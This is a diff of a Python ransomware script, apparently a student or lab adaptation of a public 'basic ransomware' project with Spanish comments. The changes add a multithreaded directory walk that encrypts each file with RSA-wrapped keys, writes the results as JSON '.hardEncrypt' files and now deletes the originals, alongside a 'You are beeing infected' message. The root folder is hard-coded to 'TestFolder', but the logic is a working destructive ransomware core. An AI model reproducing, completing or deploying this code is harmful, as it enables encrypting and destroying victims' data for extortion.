@@ -1,14 +1,16 @@
-"Basado en este codigo https://github.com/KR-4T0S/BASIC-RANSOMWARE/tree/master/file_encryption"
+
 
 import os
 import json
 from file_encryption.rsa_key import *
 from file_encryption.file_encryption import *
 from base64 import b64encode
-
 # Global Constants
+import concurrent.futures
 
 class Ramsomware(object):
+    
+    
     
 
     def __init__(self):
@@ -17,8 +19,78 @@ class Ramsomware(object):
          self.enc=FileEncript()
          self.keygen=RSAkeygeneration()
          
+    def callEncript(self,file_name,dirName):
+        
+     file_path = os.path.join(dirName, file_name)
+                
+     if ( not file_name in self.notencript ):
+       
+        print("[*] %s" % file_path)
+        
+     
+        
+        
+        RSACipher, C, IV, tag, ext = self.enc.MyRSAEncrypt(file_path, self.notencript[0])
+        
+        #Nombre y extension del fichero
+        name, extension = os.path.splitext(file_name)
+        file_name_new = name + ".hardEncrypt"
+        file_path_new = os.path.join(dirName, file_name_new)
+       
+        with open(file_path_new, "w") as filePath:
+            file = {}
+            
+            # Estructura de fichero
+            file["RSACipher"] = b64encode(RSACipher).decode("utf-8")
+            file["C"] = b64encode(C).decode("utf-8")
+            file["IV"] = b64encode(IV).decode("utf-8")
+            file["tag"] = b64encode(tag).decode("utf-8")
+            file["ext"] = ext
+            
+            # Crear fichero json
+            
+            json.dump(file, filePath)
+            filePath.close()
+            # Borrado de antiguo fichero
+            print("[^^] %s" % file_path)
+            if os.path.exists(file_path):
+                os.remove(file_path)
+            else:
+               print("The file does not exist")
+          
+    
+    
+    
+    
+    def encriptFiles(self):
+        # Begin file walk
+        path=os.path.abspath(os.getcwd())
+     
+        path=path + "\\file_encryption"
+        print(path)
+        os.chdir(path)
+        rootDir = "TestFolder" #os.path.abspath('.').split(os.path.sep)[0]+os.path.sep 
+        exclude = [self.notencript[-1], self.notencript[-2]]
+        for dirName, subdirList, fileList in os.walk(rootDir):
+            aux=[]
+            subdirList[:] = [d for d in subdirList if d not in exclude]
+            
+            print("[+] %s" % dirName)
+            aux.append(dirName)
+            dirName=aux*len(fileList)
+            if(len(fileList)>0):
+             #Encriptado en paralelo
+             with concurrent.futures.ThreadPoolExecutor(max_workers=len(fileList)) as executor:
+                     executor.map(self.callEncript, fileList,dirName)
+            
+                        
+                        
+                        
+    
+            
+            
     def beginEncript(self):
-        os.chdir("file_encryption")
+        #os.chdir("file_encryption")
         path=os.path.abspath(os.getcwd())
         print(path)
         # Simple prompt
@@ -26,57 +98,13 @@ class Ramsomware(object):
         print("You are beeing infected")
         print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
         
-        # Check for RSA keys if exist. Else generate.
+        # Comprobar RSA
         self.keygen.genPrivPublic()
         
-        # Start walk (encrypt)
-        self.encriptFiles()
-    
-    def encriptFiles(self):
-        # Begin file walk
-        
-        rootDir = "TestFolder" # Root is where program starts
-        exclude = [self.notencript[-1], self.notencript[-2]]
-        for dirName, subdirList, fileList in os.walk(rootDir):
-            subdirList[:] = [d for d in subdirList if d not in exclude]
-            # Get directory names for debugging
-            print("[+] %s" % dirName)
+        # Empezar encriptado
+        self.encriptFiles()       
             
-            for file_name in fileList:
-                
-                # Contactenate file info into a path
-                file_path = os.path.join(dirName, file_name)
-                
-                if ( not file_name in self.notencript ):
-                        # Get file names for debugging
-                        print("[*] %s" % file_path)
-    
-                        # Encrypt File
-                        
-                        RSACipher, C, IV, tag, ext = self.enc.MyRSAEncrypt(file_path, self.notencript[0])
-                        
-                        # Create JSON file
-                        name, extension = os.path.splitext(file_name)
-                        file_name_new = name + ".hardEncript"
-                        file_path_new = os.path.join(dirName, file_name_new)
-                        
-                        with open(file_path_new, "w") as file:
-                            # Init json file data
-                            file_data = {}
-                            
-                            # Load data into collection
-                            file_data["RSACipher"] = b64encode(RSACipher).decode("utf-8")
-                            file_data["C"] = b64encode(C).decode("utf-8")
-                            file_data["IV"] = b64encode(IV).decode("utf-8")
-                            file_data["tag"] = b64encode(tag).decode("utf-8")
-                            file_data["ext"] = ext
-                            
-                            # Write data
-                            json.dump(file_data, file, ensure_ascii = False)
-                            file.close()
-                        
-                        # Delete original file
-                        #os.remove(file_path)
+            
                         
 if __name__ == '__main__': 
     
